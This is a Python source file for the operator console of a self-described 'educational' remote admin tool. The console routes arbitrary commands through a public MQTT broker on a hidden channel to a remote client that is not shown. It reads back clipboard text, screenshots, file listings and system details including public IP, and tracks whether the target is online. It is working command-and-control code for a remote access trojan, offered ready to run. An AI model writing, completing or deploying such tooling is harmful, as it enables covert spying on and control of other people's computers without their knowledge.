"""
EDUCATIONAL REMOTE ADMIN TOOL - GUI CONSOLE (relay version)
==========================================================
Connects OUT to the same free public relay as the client.
No port forwarding needed. Works from anywhere.

HOW TO RUN:
    python server_gui.py
"""

import json
import sys
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("Run: pip install paho-mqtt")
    sys.exit(1)

# Same secret channel as the client
MQTT_HOST = "broker.emqx.io"
MQTT_PORT = 1883
CHANNEL = "edu-ra-a7f3k9q2"
TOPIC_CMDS = f"{CHANNEL}/cmds"
TOPIC_RESPONSES = f"{CHANNEL}/responses"

HELP_TEXT = """Type any command and press Enter. Examples:

  sysinfo   - OS, user, public IP     | ls      - list files
  battery   - battery status         | clip    - clipboard text
  screenshot- take screenshot        | lock    - lock screen
  msg <text>- show message box       | help    - all commands
"""


class AdminGUI:
    def __init__(self):
        self.running = True

        self.root = tk.Tk()
        self.root.title("Edu Remote Admin - Console")
        self.root.geometry("800x600")
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        top = ttk.Frame(self.root, padding=5)
        top.pack(fill=tk.X)
        self.status_label = ttk.Label(
            top, text="Connecting to relay...", foreground="blue"
        )
        self.status_label.pack(side=tk.LEFT)

        self.output = scrolledtext.ScrolledText(
            self.root, wrap=tk.WORD, state=tk.DISABLED
        )
        self.output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        bottom = ttk.Frame(self.root, padding=5)
        bottom.pack(fill=tk.X)
        self.cmd_entry = ttk.Entry(bottom)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.cmd_entry.bind("<Return>", lambda e: self.send_command())
        ttk.Button(bottom, text="Send", command=self.send_command).pack(
            side=tk.LEFT, padx=5
        )

        quick_frame = ttk.Frame(self.root, padding=5)
        quick_frame.pack(fill=tk.X)
        for label in ["sysinfo", "ls", "help", "clip", "battery", "uptime"]:
            ttk.Button(
                quick_frame, text=label,
                command=lambda c=label: self.send_quick(c)
            ).pack(side=tk.LEFT, padx=2)

        self.client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"edu-ra-admin-{int(time.time())}",
            protocol=mqtt.MQTTv5
        )
        self.last_seen = 0
        self.is_online = False
        self.root.after(15000, self._check_heartbeat)

        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.connect_async(MQTT_HOST, MQTT_PORT, keepalive=60)
        self.client.loop_start()

        self.log("[*] Connecting to relay...")
        self.log(HELP_TEXT)

    def on_connect(self, client, userdata, flags, rc, properties=None):
        client.subscribe(TOPIC_RESPONSES)
        self.root.after(0, lambda: self.status_label.config(
            text=f"Connected to relay - waiting for clients",
            foreground="green"
        ))

    def on_message(self, client, userdata, msg):
        try:
            data = json.loads(msg.payload.decode())
        except Exception:
            return

        if "event" in data and data["event"] == "online":
            cid = data.get('client', '?')
            self.last_seen = time.time()
            if self.is_online:
                self.log(f"[!] Client RECONNECTED: {cid}")
            else:
                self.log(f"[+] Client online: {cid}")
            self.is_online = True
            self.root.after(0, lambda: self.status_label.config(
                text=f"CONNECTED: {cid}",
                foreground="green"
            ))
        elif "event" in data and data["event"] == "ping":
            # Heartbeat - silent, just remember we saw them
            self.last_seen = time.time()
            self.root.after(0, lambda: self.status_label.config(
                text=f"CONNECTED: {data.get('client', '?')}",
                foreground="green"
            ))
        elif "event" in data and data["event"] == "offline":
            self.is_online = False
            self.log(f"[!] Client went OFFLINE: {data.get('client', '?')}")
            self.root.after(0, lambda: self.status_label.config(
                text="OFFLINE - no client connected",
                foreground="red"
            ))
        elif "result" in data:
            self.log(f"[{data.get('client', '?')}]\n{data['result']}")


    def _check_heartbeat(self):
        # Missed pings for 90s = client is gone (e.g. laptop died,
        # no clean disconnect was possible)
        if self.is_online and time.time() - self.last_seen > 90:
            self.is_online = False
            self.log("[!] Client OFFLINE (no heartbeat for 90s)")
            self.status_label.config(
                text="OFFLINE - no client connected",
                foreground="red"
            )
        self.root.after(15000, self._check_heartbeat)

    def log(self, text):
        self.output.config(state=tk.NORMAL)
        self.output.insert(tk.END, text + "\n")
        self.output.see(tk.END)
        self.output.config(state=tk.DISABLED)

    def send_quick(self, cmd):
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, cmd)
        self.send_command()

    def send_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        self.cmd_entry.delete(0, tk.END)
        self.log(f"> {cmd}")
        self.client.publish(TOPIC_CMDS, json.dumps({"cmd": cmd}))

    def on_close(self):
        self.running = False
        self.client.disconnect()
        self.client.loop_stop()
        self.root.destroy()

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    app = AdminGUI()
    app.run()
